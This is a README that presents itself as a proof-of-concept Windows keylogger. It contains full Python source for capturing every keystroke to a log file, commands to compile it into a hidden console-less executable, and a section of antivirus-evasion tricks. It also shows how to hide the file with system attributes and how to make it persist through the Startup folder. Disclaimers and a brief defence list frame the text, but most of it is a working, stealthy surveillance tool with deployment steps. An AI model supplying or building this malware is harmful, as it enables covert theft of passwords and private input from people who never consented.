# Windows Keylogger - Proof of Concept

## ⚠️ Disclaimer
> This project is for **educational purposes only**. Do not use it for illegal activities. Unauthorized use of keyloggers is illegal and unethical. Only test on your own system or with explicit permission.

## 📌 Overview
This is a simple **Windows keylogger** written in Python. It captures keystrokes and logs them to a file (`log.txt`). The script runs in the background and can be compiled into an `.exe` for stealthy execution.

## 🔧 Features
- Captures **all keystrokes** (letters, special keys, spaces, and enters)
- Stores logs in **`%APPDATA%\log.txt`**
- Runs **silently** in the background
- Can be converted into a **standalone executable** (`.exe`)
- Supports **various obfuscation techniques** to bypass antivirus (AV) detection

---

## 🚀 Installation & Usage
### **Step 1: Install Required Modules**
Ensure Python is installed, then run:
```bash
pip install pynput
```

### **Step 2: Create the Keylogger Script**
Save the following as `keylogger.py`:

```python
from pynput import keyboard
import os

# Define log file location
log_file = os.path.join(os.getenv("APPDATA"), "log.txt")

def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(key)

def on_press(key):
    try:
        if key == keyboard.Key.space:
            write_to_file(" ")
        elif key == keyboard.Key.enter:
            write_to_file("\n")
        elif hasattr(key, 'char'):
            write_to_file(key.char)
        else:
            write_to_file(f" [{key}] ")
    except Exception as e:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

### **Step 3: Convert to an Executable (Stealth Mode)**
To run the script on a machine **without Python installed**, convert it to an executable:

```bash
pyinstaller --onefile --noconsole --name=stealth.exe keylogger.py
```

📌 **Explanation:**
- `--onefile` → Bundles everything into a single `.exe`
- `--noconsole` → Hides the terminal window
- `--name=stealth.exe` → Renames output file

The executable will be generated in the `dist/` folder.

### **Step 4: Running the Keylogger**
Simply run:
```bash
./stealth.exe
```

Keystrokes will be logged in:
```plaintext
C:\Users\YourUsername\AppData\Roaming\log.txt
```

---

## 🔥 Stealth & Obfuscation Techniques
### **1️⃣ Change Function & Variable Names**
Windows Defender detects common function names. Rename them:
```python
def k_capture(k):  # Instead of on_press
```

### **2️⃣ Encode Keystrokes**
Instead of writing raw text:
```python
write_to_file(str(ord(key.char)) + " ")
```

### **3️⃣ Change Log File Location**
```python
log_file = os.path.join("C:\\Users\\Public", "win32_logs.txt")
```

### **4️⃣ Hide the Executable**
Move it to a system folder and make it hidden:
```powershell
move stealth.exe C:\Users\Public\Libraries\
attrib +h +s C:\Users\Public\Libraries\stealth.exe
```

### **5️⃣ Run at Startup (Persistence)**
Add to Windows startup folder:
```powershell
$path = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\stealth.exe"
Copy-Item "C:\Users\Public\Libraries\stealth.exe" -Destination $path
```

### **6️⃣ Use a Different Compiler to Reduce AV Detection**
Instead of PyInstaller, try Nuitka:
```bash
pip install nuitka
nuitka --onefile --windows-disable-console keylogger.py
```

---

## 🛡 Defense Against Keyloggers
🔹 **Enable Windows Defender** and keep it updated
🔹 **Monitor Startup Items** (`msconfig`)
🔹 **Use Anti-Keylogger Tools**
🔹 **Check Suspicious Processes** in Task Manager

---

## ⚠️ Ethical Reminder
🚨 **This project is strictly for research and learning. Do not use it on unauthorized systems.** 🚨

